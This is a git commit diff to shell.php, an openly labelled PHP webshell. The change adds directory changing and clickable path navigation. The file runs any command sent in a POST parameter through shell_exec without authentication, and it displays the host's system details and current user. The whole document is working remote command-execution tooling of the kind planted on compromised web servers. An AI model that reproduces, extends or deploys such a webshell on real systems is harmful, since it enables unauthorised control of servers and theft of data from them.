f21bdef35887dce10115b76aa19a1e1e9e3d1e0e
Yevhenii Deshchenko <jeniadeshchenko@gmail.com>
2024-05-28 00:50:53 +0200

    Dir change allowed

--- shell.php
+++ shell.php
@@ -1,8 +1,13 @@
 <?php
     $NAME = "Webshell";
+
+    if(isset($_POST["chdir"])){
+        chdir($_POST["chdir"]);
+    }
+
     $CURRENT_DEVICE = shell_exec("uname -a");
     $CURRENT_USER = shell_exec("whoami");
-    $CURRENT_DIR = shell_exec("pwd");
+    $CURRENT_DIR = trim(shell_exec("pwd"));
 ?>
 
 <!DOCTYPE html>
@@ -17,19 +22,49 @@
         <div>
             Device: <?php echo $CURRENT_DEVICE; ?><br>
             Current user: <?php echo $CURRENT_USER; ?><br>
-            Current directory: <?php echo $CURRENT_DIR; ?><br>
+            Current directory:
+            <?php
+                $path_parts = explode('/', trim($CURRENT_DIR));
+                $total_path = "";
+                foreach ($path_parts as $dir) {
+                        $dir = $dir.'/';
+                        $total_path = $total_path.$dir;
+                        echo "<form method=\"post\" action=\"".htmlspecialchars($_SERVER["PHP_SELF"])."\" class=\"nav-btn\">
+                        <input type=\"hidden\" name=\"chdir\" value=\"".$total_path."\">
+                        <input type=\"submit\" value=\"".$dir."\">
+                        </input></form>";
+                }
+            ?><br>
         </div>
 
         <?php
-            if(isset($_POST["sh"]))
-                $CMD = shell_exec($_POST["sh"]." 2>&1");
+            if(isset($_POST["sh"])){
+                $CMD = shell_exec("cd ".$CURRENT_DIR." && ".$_POST["sh"]." 2>&1");
+            }
         ?>
 
-        <form method="post" action="<?php htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
+        <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
             <input type="text" name="sh" autocomplete="off" autofocus>
+            <input type="hidden" name="chdir" value="<?php echo $CURRENT_DIR; ?>">
             <input type="submit" value="Run">
         </iframe>
 
         <pre><?php echo $CMD; ?></pre>
+
+        <style>
+            .nav-btn{
+                display: inline;
+            }
+            .nav-btn input{
+                background: none;
+                border: none;
+                outline: none;
+                text-decoration: underline;
+                color: blue;
+                cursor: pointer;
+                margin: 0;
+                padding: 0;
+            }
+        </style>
     </body>
 </html>
